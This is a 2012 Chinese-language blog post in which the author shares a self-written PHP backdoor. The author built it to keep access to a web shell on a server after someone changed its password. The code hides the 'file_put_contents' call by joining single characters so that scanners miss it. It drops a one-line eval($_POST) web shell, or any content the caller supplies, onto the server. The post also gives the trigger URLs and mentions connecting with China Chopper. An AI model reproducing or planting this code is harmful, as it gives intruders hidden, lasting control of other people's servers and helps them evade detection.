title: "自己写的一个PHP后门"
id: 64
date: 2012-07-01 12:58:04
tags: 
- 后门
categories: 
- 原创作品
---

今天去连接很久以前的一个shell(目的是做个实验)结果~~被人改密码了。 好吧，你丫的改，看看我怎么收拾你。

所以就想写一个后门，为啥呢？省的又被改或者删了呗，现在的大马带有后门检测功能。所以为了防止被杀。。。。

其实这个后门的思路是来自之前在思派尔工作的头，他当时给我看了一个别人的后门结果一看真的很猥琐，

全部用连接符连接起来的字符串查杀木马的程序在强大也不可能把这个查出来的，所有就有了今天这个后门。

###代码：

```php

<?php
/*
 * PHP后门程序
 * 使用说明：此程序默认会在当前目录下生成一句话cmd.php密码cmd
 * 不含有任何敏感函数有它也查不出来所以免杀是必然的。生成的一句
 * 不是免杀的，要免杀原理已经能看到了，自行处理。
 * 亲，使用的时候注意删除这里的注释~~
 * BY: Return Data:2012.6.29
 */
function scm(){
 $pod = '123'; //密码
 $_GET['ct'] == $pod ? '' : exit();
 $fcn = 'f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
 if(@$_GET['sf']=='yes'){
 $fnm = $_GET['filepath'];
 $fct = $_GET['content'];
 }else{
 $fnm = 'c'.'m'.'d'.'.'.'p'.'h'.'p';
 $fct = '<'.'?'.'p'.'h'.'p'.' @'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'&quot;'.'c'.'m'.'d'.'&quot;'.']'.')'.'?'.'>';
 }
 @$fcn($fnm, $fct);
 echo 'succeed!';
}
scm();
?>
```
<!--more-->
##使用方法：

参数：ct 为密码 ，sf 为是否使用自定义内容，

filepath 自定义文件路径，content 自定义文件内容

自带后门生成方法 ： door.php?ct=密码

自定义后门生成方法： door.php?ct=密码&amp;sf=yes&amp;filepath=文件路径&amp;content=文件内容

注意：

自动生成后门会在当前目录下生成一个cmd.php密码为cmd的一句话，怎么使用一句话？

菜刀连接，你懂得~~
